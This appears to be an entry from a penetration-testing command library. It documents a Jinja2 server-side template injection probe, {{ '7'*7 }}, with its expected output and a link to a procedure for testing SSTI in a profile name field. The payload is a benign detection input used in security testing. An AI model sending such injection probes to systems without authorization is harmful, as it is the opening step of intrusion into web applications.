---
id: c0cdd98f-43c3-4741-a54c-233967f038bb
name: jinja2-basic-expression
type: command
executor: bash
data: '{{ ''7''*7 }}'
output: null
created_at: '2025-12-11T03:47:39.257Z'
updated_at: '2025-12-11T03:47:39.257Z'
platforms:
  - Web
tags:
  - ssti
  - jinja2
verified: false
validated: true
submitted: true
---

# jinja2-basic-expression

## Command

```bash
{{ '7'*7 }}
```

## Description

Multiplies the string '7' by 7 using Python string repetition, testing for Jinja2 template evaluation in SSTI vulnerabilities.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| expression | '7'*7 - performs string repetition in Python | Yes |

## Examples

### Basic Usage

```bash
{{ '7'*7 }}
```

### Advanced Usage

```bash
{{ 'test'*3 }}
```

## Expected Output

'7777777'

## Related

- [[procedures/Test-Basic-SSTI-Injection-in-Profile-Name]]
